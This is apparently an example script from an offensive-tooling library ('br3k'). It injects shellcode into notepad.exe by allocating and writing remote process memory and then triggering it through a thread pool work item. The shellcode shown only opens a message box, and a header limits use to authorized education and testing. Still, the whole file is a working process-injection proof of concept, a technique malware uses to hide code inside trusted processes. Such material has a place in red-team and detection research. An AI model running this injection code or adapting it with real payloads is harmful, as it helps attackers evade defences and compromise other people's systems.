# =============================================================================
# IMPORTANT USAGE NOTICE
# 1. Use only for authorized, non-malicious education, research, and testing.
# =============================================================================

import br3k
from br3k import ProcessOpenStrategy, ProcessVmWriteStrategy, ThreadPoolWorkItem

PROCESS_NAME = "notepad.exe"
THREAD_POOL_WORK_ITEM = ThreadPoolWorkItem.TP_DIRECT

if __name__ == "__main__":

    print("Script: Inject via thread pool work item")
    print()

    br3k.init_sysapi()

    shellcode = br3k.shellcode_get_messageboxw()

    process = br3k.Process(
        name=PROCESS_NAME,
        process_vm_write_strategy=ProcessVmWriteStrategy.AllocateInAddr,
        process_open_strategy=ProcessOpenStrategy.OpenProcess
    )

    process.open()
    process.init_memory()
    process.create_memory(size=len(shellcode))
    ep = process.get_memory_remote_address()
    process.write_memory(data=shellcode)

    thread_pool = br3k.ThreadPool(process)
    thread_pool.set_ep(work_item_type=THREAD_POOL_WORK_ITEM, ep=ep)
